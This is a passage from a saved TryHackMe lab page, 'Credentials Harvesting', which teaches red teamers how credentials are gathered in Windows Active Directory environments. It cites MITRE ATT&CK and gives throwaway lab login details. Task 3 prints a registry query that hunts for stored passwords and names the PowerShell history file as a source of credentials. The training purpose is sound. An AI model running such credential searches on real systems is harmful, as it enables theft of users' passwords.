<tr id="scoreboard_header" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<th data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Rank</th>
<th data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Username</th>
<th data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Total Score</th>
</tr>
</thead>
<tbody id="scoreboard_body" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"></tbody>
</table>
</div>
<div id="chat" class="tab-pane fade hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">

<div class="row hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="col-sm-6 text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<h3 class="mb-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Discord</h3>
<p data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Come join our <a target="_blank" href="https://discord.gg/QgC6Tdk" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Discord</a> server for support or further discussions</p>
</div>
<div class="col-sm-6 text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<h3 class="mb-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Forum</h3>
<div id="forum-text" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Read or post on the dedicated forum <a href="https://tryhackme.com/forum/thread/6310bae091f9effb72f6045b" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">post</a></div>
</div>
</div>
</div>
<div id="writeups" class="tab-pane text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div id="writeups-data" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">There are no writeups submitted.</div>
<button onclick="showWriteupForm(this)" type="button" class="btn btn-xs btn-secondary mt-3 mb-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Add Writeup</button>
<div id="writeup-form" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<div class="form-row hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="col-auto hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<input type="text" class="form-control mb-2 hidden-originally" id="writeup-title" placeholder="Writeup Title" data-pf_style_display="none" data-pf_style_visibility="hidden" value="">
</div>
<div class="col-auto hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<input type="text" class="form-control mb-2 hidden-originally" id="writeup-link" placeholder="Writeup URL" data-pf_style_display="none" data-pf_style_visibility="hidden" value="">
</div>
<div class="col-auto hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<button id="submit-writeup" type="submit" class="btn btn-success mb-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Submit</button>
</div>
</div>
<p class="faded mb-0 size-14 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fas fa-exclamation-triangle text-warning hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i> Writeups should have a link to TryHackMe and not include any passwords/cracked hashes/flags</p>
</div>
</div>
<div id="about" class="tab-pane text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<p id="about-freeRoom" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><p class="mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Only subscribers can deploy virtual machines in this room! 
        Go to your <a href="https://tryhackme.com/profile" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">profile</a> page to subscribe (if you have not already). 7728 users are in here and this room is 318 days old.</p></p>
<p id="about-owner" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><p class="size-18 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Created by <img class="avatar-tiny hidden-originally" src="./TryHackMe _ Credentials Harvesting_files/af7feb2c43a2c7d5f111b98ccbd15048.png" data-pf_style_display="none" data-pf_style_visibility="hidden"> 
        <a class="green-link hidden-originally" href="https://tryhackme.com/p/tryhackme" data-pf_style_display="none" data-pf_style_visibility="hidden">tryhackme</a> and <img class="avatar-tiny hidden-originally" src="./TryHackMe _ Credentials Harvesting_files/26286532ed37cf8b7b375905f4306110.png" data-pf_style_display="none" data-pf_style_visibility="hidden"> 
        <a class="green-link hidden-originally" href="https://tryhackme.com/p/arebel" data-pf_style_display="none" data-pf_style_visibility="hidden">arebel</a></p></p>
</div>
</div>
</span>
</div>
</div>
</div>
<div id="room-simple-video" class="card card-body cd-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="visible"></div>
<div class="card mt-3 mb-3 cd-2 text-center hidden-originally" id="instance-info" data-pf_style_display="none" data-pf_style_visibility="visible">
<div class="card-header card-header-red hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Active Machine Information</div>
<div class="card-body hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="row vertical-align-custom hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="col-sm-3 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Loading...</i>
</div>
<div class="col-sm-3 hidden-originally" id="table-machine-ip" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Loading...</i>
</div>
<div class="col-sm-3 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Loading...</i>
</div>
<div class="col-sm-3 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Loading...</i>
</div>
</div>
</div>
</div>
<div id="task-list" data-pf_style_display="block" data-pf_style_visibility="visible">
<div id="room-task-detail" class="mb-3" data-pf_style_display="flex" data-pf_style_visibility="visible"><span id="progress-bar" style="display: block;" data-pf_style_display="block" data-pf_style_visibility="visible"><div class="progress" data-pf_style_display="flex" data-pf_style_visibility="visible"><div class="progress-bar bg-secondary" role="progressbar" style="width: 5%; aria-valuemin=" 0"="" aria-valuemax="100" data-pf_style_display="flex" data-pf_style_visibility="visible"> 0%</div></div></span></div>
<div id="taskContent" data-pf_style_display="block" data-pf_style_visibility="visible"><div class="card" id="task-1" data-pf_style_display="flex" data-pf_style_visibility="visible">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse1" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <a class="card-link" data-pf_style_display="inline" data-pf_style_visibility="visible">
                            <span class="task-dropdown-title red" data-pf_style_display="inline" data-pf_style_visibility="visible">Task 1                             <span class="task-dropdown-icon" data-pf_style_display="inline" data-pf_style_visibility="visible"><i class="far fa-circle text-lgray" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span></span> Introduction
                            <span class="float-right" data-pf_style_display="block" data-pf_style_visibility="visible"><i class="fas fa-chevron-down" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span>
                            <span class="task-resources" data-pf_style_display="block" data-pf_style_visibility="visible"></span>
                        </a>
                    </div>
                    <div id="collapse1" class="collapse show" data-parent="#taskContent" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <div class="card-body task-incomplete" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <div class="room-task-desc" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <div class="room-task-desc-data" data-pf_style_display="block" data-pf_style_visibility="visible"> <p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="color:rgb(46, 51, 56);font-family:Ubuntu;font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Welcome to Credentials Harvesting</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible">This room discusses the fundamental knowledge for red teamers taking advantage of obtained credentials to perform Lateral Movement and access resources within the AD environment.&nbsp;<span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">We will be showing how to obtain, reuse, and impersonate user credentials.</span><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">&nbsp;</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible">Credential harvesting consists of techniques for obtaining credentials like login information, account names, and passwords. It is a technique of extracting credential information from a system in various locations such as clear-text files, registry, memory dumping, etc.&nbsp;</p><p data-pf_style_display="block" data-pf_style_visibility="visible">As a red teamer, gaining access to legitimate credentials has benefits:</p><ul data-pf_style_display="block" data-pf_style_visibility="visible"><li data-pf_style_display="list-item" data-pf_style_visibility="visible"><span style="color:rgb(46, 51, 56);font-family:Ubuntu;font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">It can give access to systems (Lateral Movement).</span></li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">It makes it harder to detect our actions.</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">It provides the opportunity to create and manage accounts to help achieve the end goals of a red team engagement.</li></ul><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="color:rgb(46, 51, 56);font-family:Ubuntu;font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Learning Objectives</span></p>

<ul data-pf_style_display="block" data-pf_style_visibility="visible"><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Understand the method of extracting credentials from local windows (SAM database)</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Learn how to access Windows memory and dump clear-text passwords and authentication tickets locally and remotely.</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Introduction to Windows Credentials Manager and how to extract credentials.</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Learn methods of extracting credentials for Domain Controller</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Enumerate the Local Administrator Password Solution (LAPS) feature.</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Introduction to AD attacks that lead to obtaining credentials.</li></ul><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Room Prerequisites</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:16px" data-pf_style_display="inline" data-pf_style_visibility="visible">We strongly suggest finishing the following Active Directory rooms before diving into this room:</span></p><ul data-pf_style_display="block" data-pf_style_visibility="visible"><li data-pf_style_display="list-item" data-pf_style_visibility="visible"><a href="https://tryhackme.com/path-action/jrpenetrationtester/join" target="_blank" data-pf_style_display="inline" data-pf_style_visibility="visible">Jr. Penetration Tester Path</a></li><li data-pf_style_display="list-item" data-pf_style_visibility="visible"><a href="https://tryhackme.com/room/activedirectorybasics" target="_blank" data-pf_style_display="inline" data-pf_style_visibility="visible">Active Directory Basics</a></li><li data-pf_style_display="list-item" data-pf_style_visibility="visible"><a href="https://tryhackme.com/room/breachingad" target="_blank" data-pf_style_display="inline" data-pf_style_visibility="visible">Breaching AD</a></li><li data-pf_style_display="list-item" data-pf_style_visibility="visible"><a href="https://tryhackme.com/room/adenumeration" target="_blank" data-pf_style_display="inline" data-pf_style_visibility="visible">Enumerating AD</a></li><li data-pf_style_display="list-item" data-pf_style_visibility="visible"><a href="https://tryhackme.com/room/lateralmovementandpivoting" target="_blank" data-pf_style_display="inline" data-pf_style_visibility="visible">Lateral Movement and Pivoting</a></li></ul></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom red" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <div data-pf_style_display="block" data-pf_style_visibility="visible">Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <div class="room-task-question-no vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
                                
                            </div>
                            <div class="room-task-question-details" data-pf_style_display="block" data-pf_style_visibility="visible">
                                I have completed room prerequisites and am ready to learn about Credentials Harvesting!
                            </div>
                        </div>

                    <div class="room-task-input" data-pf_style_display="grid" data-pf_style_visibility="visible">
                        <div class="room-task-input-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <input type="hidden" value="1" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                            <input type="hidden" value="1" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                        </div>
                        <div class="room-task-input-answer" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <i class="far fa-paper-plane" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i> Completed
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-2" data-pf_style_display="flex" data-pf_style_visibility="visible">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse2" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <a class="card-link" data-pf_style_display="inline" data-pf_style_visibility="visible">
                            <span class="task-dropdown-title red" data-pf_style_display="inline" data-pf_style_visibility="visible">Task 2                             <span class="task-dropdown-icon" data-pf_style_display="inline" data-pf_style_visibility="visible"><i class="far fa-circle text-lgray" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span></span> Credentials Harvesting
                            <span class="float-right" data-pf_style_display="block" data-pf_style_visibility="visible"><i class="fas fa-chevron-down" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span>
                            <span class="task-resources" data-pf_style_display="block" data-pf_style_visibility="visible"><i class="far fa-server text-lgreen" data-toggle="tooltip" data-placement="left" title="" data-original-title="Task includes a deployable machine" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span>
                        </a>
                    </div>
                    <div id="collapse2" class="collapse show" data-parent="#taskContent" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <div class="card-body task-incomplete" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <div class="room-task-desc" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <div class="room-task-desc-data" data-pf_style_display="block" data-pf_style_visibility="visible"><div class="btn-group mb-3 ml-3 float-right" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <button type="button" class="btn btn-success" value="62a7061f1eee2e0049bbee48" onclick="deploy(this)" data-pf_style_display="block" data-pf_style_visibility="visible"><i class="fas fa-play mr-2" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i> Start Machine</button>
        </div> <p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Credentials Harvesting</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible">Credentials Harvesting is a term for gaining access to user and system credentials.&nbsp;<span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">It is a technique to look for or steal stored credentials, including network sniffing, where an attacker captures transmitted credentials.&nbsp;</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">Credentials can be found in a variety of different forms, such as:</span></p><ul data-pf_style_display="block" data-pf_style_visibility="visible"><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Accounts details (usernames and passwords)</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Hashes that include NTLM hashes, etc.</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Authentication Tickets: Tickets Granting Ticket (TGT), Ticket Granting Server (TGS)<br data-pf_style_display="inline" data-pf_style_visibility="visible"></li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Any information that helps login into a system&nbsp;(private keys, etc.)</li></ul><p data-pf_style_display="block" data-pf_style_visibility="visible">Generally speaking, there are two types of credential harvesting: external and internal. External credential harvesting most likely involves phishing emails and other techniques to trick a user into entering his username and password. If you want to learn more about phishing emails, we suggest trying the THM <a href="https://tryhackme.com/room/phishingyl" target="_blank" data-pf_style_display="inline" data-pf_style_visibility="visible">Phishing </a>room. Obtaining credentials through the internal network uses different approaches.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">In this room, the focus will be on harvesting credentials from an internal perspective where a threat actor has already compromised a system and gained initial access.&nbsp;</p><p data-pf_style_display="block" data-pf_style_visibility="visible">We have provided a Windows Server 2019 configured as a Domain Controller. To follow the content discussed in this room, deploy the machine and move on to the next task.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">You can access the machine in-browser or through&nbsp;<a class="w0Bz1dpI glossary-term" data-pf_style_display="inline" data-pf_style_visibility="visible">RDP</a>&nbsp;using the credentials below.</p><p style="text-align:center" data-pf_style_display="block" data-pf_style_visibility="visible">Machine IP:&nbsp;<span class="notion-enable-hover" style="text-align:left;font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em" data-pf_style_display="inline" data-pf_style_visibility="visible">MACHINE_IP</span><span style="font-size:1rem;text-align:left" data-pf_style_display="inline" data-pf_style_visibility="visible">&nbsp;</span><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Username:&nbsp;</span><span class="notion-enable-hover" style="text-align:left;font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em" data-pf_style_display="inline" data-pf_style_visibility="visible">thm</span><span style="font-size:1rem;text-align:left" data-pf_style_display="inline" data-pf_style_visibility="visible">&nbsp;</span><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">Password:&nbsp;</span><span class="notion-enable-hover" style="text-align:left;font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em" data-pf_style_display="inline" data-pf_style_visibility="visible">Passw0rd!</span><span style="font-size:1rem;text-align:left" data-pf_style_display="inline" data-pf_style_visibility="visible">&nbsp;</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:1rem;text-align:left" data-pf_style_display="inline" data-pf_style_visibility="visible">Ensure to deploy the AttackBox as it is required in attacks discussed in this room.</span></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom red" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <div data-pf_style_display="block" data-pf_style_visibility="visible">Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <div class="room-task-question-no vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
                                
                            </div>
                            <div class="room-task-question-details" data-pf_style_display="block" data-pf_style_visibility="visible">
                                I'm ready to get started!&nbsp;
                            </div>
                        </div>

                    <div class="room-task-input" data-pf_style_display="grid" data-pf_style_visibility="visible">
                        <div class="room-task-input-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <input type="hidden" value="1" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                            <input type="hidden" value="2" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                        </div>
                        <div class="room-task-input-answer" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <i class="far fa-paper-plane" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i> Completed
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-3" data-pf_style_display="flex" data-pf_style_visibility="visible">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse3" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <a class="card-link" data-pf_style_display="inline" data-pf_style_visibility="visible">
                            <span class="task-dropdown-title red" data-pf_style_display="inline" data-pf_style_visibility="visible">Task 3                             <span class="task-dropdown-icon" data-pf_style_display="inline" data-pf_style_visibility="visible"><i class="far fa-circle text-lgray" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span></span> Credential Access
                            <span class="float-right" data-pf_style_display="block" data-pf_style_visibility="visible"><i class="fas fa-chevron-down" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span>
                            <span class="task-resources" data-pf_style_display="block" data-pf_style_visibility="visible"></span>
                        </a>
                    </div>
                    <div id="collapse3" class="collapse show" data-parent="#taskContent" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <div class="card-body task-incomplete" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <div class="room-task-desc" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <div class="room-task-desc-data" data-pf_style_display="block" data-pf_style_visibility="visible"> <p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Credential Access</span><br data-pf_style_display="inline" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible">Credential access is where adversaries may find credentials in compromised systems and gain access to user credentials. It helps adversaries to reuse them or impersonate the identity of a user. This is an important step for lateral movement and accessing other resources such as other applications or systems. Obtaining legitimate user credentials is preferred rather than exploiting systems using CVEs.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">For more information, you may visit the&nbsp;<span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">MITRE ATT&amp;CK framework (</span><a href="https://attack.mitre.org/tactics/TA0006/" target="_blank" data-pf_style_display="inline" data-pf_style_visibility="visible">TA0006</a>).</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">Credentials are stored insecurely in various locations in systems:</p><ul data-pf_style_display="block" data-pf_style_visibility="visible"><li data-pf_style_display="list-item" data-pf_style_visibility="visible"><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">Clear-text files</span></li><li data-pf_style_display="list-item" data-pf_style_visibility="visible"><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">Database files</span></li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Memory</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Password managers</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Enterprise Vaults</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Active Directory</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Network Sniffing</li></ul><p data-pf_style_display="block" data-pf_style_visibility="visible">Let's discuss them a bit more!</p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Clear-text files</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible">Attackers may search a compromised machine for credentials in local or remote file systems. Clear-text files could include sensitive information created by a user, containing passwords, private keys, etc. The&nbsp;<span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">MITRE ATT&amp;CK framework defines it as&nbsp;</span><b data-pf_style_display="inline" data-pf_style_visibility="visible">Unsecured Credentials: Credentials In Files</b><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">&nbsp;(</span><a href="https://attack.mitre.org/techniques/T1552/001/" target="_blank" data-pf_style_display="inline" data-pf_style_visibility="visible">T1552.001</a>).</p><p data-pf_style_display="block" data-pf_style_visibility="visible">The following are some of the types of clear-text files that an attacker may be interested in:</p><ul data-pf_style_display="block" data-pf_style_visibility="visible"><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Commands history</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Configuration files (Web App, FTP files, etc.)</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Other Files related to Windows Applications (Internet Browsers, Email Clients, etc.)</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Backup files</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Shared files and folders</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Registry</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">Source code&nbsp;</li></ul><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible"></span></p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">As an example of a history command, a PowerShell saves executed PowerShell commands in a history file in a user profile in the following path:&nbsp;<code data-pf_style_display="inline-block" data-pf_style_visibility="visible">C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></p><p data-pf_style_display="block" data-pf_style_visibility="visible">It might be worth checking what users are working on or finding sensitive information. Another example would be finding interesting information. For example, the following command is to look for the "password" keyword in the Window registry.</p>

<div class="terminal-container" data-pf_style_display="block" data-pf_style_visibility="visible">
    <div class="terminal-content" data-pf_style_display="block" data-pf_style_visibility="visible">
        <div class="terminal-top" data-pf_style_display="flex" data-pf_style_visibility="visible">
            Looking for the "password" Keyword in the Registry
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0" data-pf_style_display="flex" data-pf_style_visibility="visible">           <code class=" language-shell-session" data-pf_style_display="block" data-pf_style_visibility="visible"><span class="token output" data-pf_style_display="inline" data-pf_style_visibility="visible">c:\Users\user&gt; reg query HKLM /f password /t REG_SZ /s
</span><span class="token command" data-pf_style_display="inline" data-pf_style_visibility="visible"><span class="token shell-symbol important" data-pf_style_display="inline" data-pf_style_visibility="visible">#</span><span class="token bash language-bash" data-pf_style_display="inline" data-pf_style_visibility="visible">OR</span></span>
<span class="token output" data-pf_style_display="inline" data-pf_style_visibility="visible">C:\Users\user&gt; reg query HKCU /f password /t REG_SZ /s</span></code>
        </pre>
    </div>
</div>


<p data-pf_style_display="block" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Database Files</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible">Applications utilize database files to read or write settings, configurations, or credentials. Database files are usually stored locally in Windows operating systems.&nbsp;<span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">These files are an excellent target to check and hunt for credentials.&nbsp;</span><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">For more information, we suggest checking THM room: </span><a href="https://tryhackme.com/room/breachingad" target="_blank" data-pf_style_display="inline" data-pf_style_visibility="visible">Breaching AD</a><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">. It contains a showcase example of extracting credentials from the local McAfee Endpoint database file.</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Password Managers</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:16px" data-pf_style_display="inline" data-pf_style_visibility="visible">A password manager is an application to store and manage users' login information for local and Internet websites and services. Since it deals with users' data, it must be stored securely to prevent unauthorized access.&nbsp;</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:16px" data-pf_style_display="inline" data-pf_style_visibility="visible">Examples of Password Manager applications:</span></p><ul data-pf_style_display="block" data-pf_style_visibility="visible"><li style="line-height:1" data-pf_style_display="list-item" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible"><span style="font-size:16px" data-pf_style_display="inline" data-pf_style_visibility="visible">Built-in password managers (Windows)</span></span></li><li style="line-height:1" data-pf_style_display="list-item" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible"><span style="font-size:16px" data-pf_style_display="inline" data-pf_style_visibility="visible">Third-party: KeePass, 1Password, LastPass</span></span></li></ul><p data-pf_style_display="block" data-pf_style_visibility="visible">However, misconfiguration and security flaws are found in these applications that let adversaries access stored data. Various tools could be used during the enumeration stage to get sensitive data in password manager applications used by Internet browsers and desktop applications.&nbsp;</p><p data-pf_style_display="block" data-pf_style_visibility="visible">This room will discuss how to access the Windows Credentials manager and extract passwords.</p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Memory Dump</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible">The Operating system's memory is a rich source of sensitive information that belongs to the Windows OS, users, and other applications. Data gets loaded into memory at run time or during the execution. Thus, accessing memory is limited to administrator users who fully control the system. </p><p data-pf_style_display="block" data-pf_style_visibility="visible">The following are examples of memory stored sensitive data, including:</p><ul data-pf_style_display="block" data-pf_style_visibility="visible"><li data-pf_style_display="list-item" data-pf_style_visibility="visible"><span style="font-size:16px" data-pf_style_display="inline" data-pf_style_visibility="visible">Clear-text credentials</span></li><li data-pf_style_display="list-item" data-pf_style_visibility="visible"><span style="font-size:16px" data-pf_style_display="inline" data-pf_style_visibility="visible">Cached passwords</span></li><li data-pf_style_display="list-item" data-pf_style_visibility="visible"><span style="font-size:16px" data-pf_style_display="inline" data-pf_style_visibility="visible">AD Tickets</span></li></ul><p data-pf_style_display="block" data-pf_style_visibility="visible">In this room, we will discuss how to get access to memory and extract clear-text passwords and authentication tickets.</p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Active Directory</span></p><p data-pf_style_display="block" 